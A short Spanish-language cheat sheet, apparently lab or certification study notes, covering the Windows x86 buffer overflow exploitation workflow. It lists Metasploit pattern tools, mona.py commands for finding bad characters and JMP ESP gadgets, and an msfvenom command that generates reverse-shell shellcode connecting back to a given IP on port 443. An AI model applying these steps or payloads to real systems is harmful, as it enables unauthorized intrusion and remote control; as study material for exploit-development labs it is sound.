## Buffer Overflow

### Generar patron

en linux

<pre>
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
</pre>

### Visualizar el numero por el valor del EIP

<pre>
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230
</pre>

### Comandos
#### Visualizar Hexadecimal a cadena

<pre>
echo -n "30426A31" | xxd -ps -r;echo
</pre>

#### Visualizar cadena a hexadecimal

<pre>
echo -n "0Bj1" | xxd -ps
</pre>

### MONA

Crear directorio de trabajo

<pre>
!mona config -set workingfolder C:\Users\j4munoff\Desktop\%p
</pre>

Crear bytearray

<pre>
!mona bytearray
</pre>

Crear bytearray excluyendo badchars
<pre>
!mona bytearray -cpb "\x00"
!mona bytearray -b "\x00"
</pre>

Ver los módulos
<pre>
!mona modules
</pre>

Ver saltos al ESP
<pre>
!mona find -s "\xff\xe4" -m Qt5Core.dll
!mona jmp -r esp -cpb "\x00"
</pre>

Comparar Byte ARRAY. La dirección es la del ESP
<pre>
!mona compare -f C:\Users\j4munoff\Desktop\SLmail\bytearray.bin -a 0249A128
</pre>


### msfvenom

<pre>
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.196.198 LPORT=443 --platform windows -a x86 -b "\x00" -f c
</pre>
### Desplazamiento de pila

<pre>
sudo /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > sub esp, 0x10
00000000  83EC10            sub esp,byte +0x10
nasm > 
</pre>
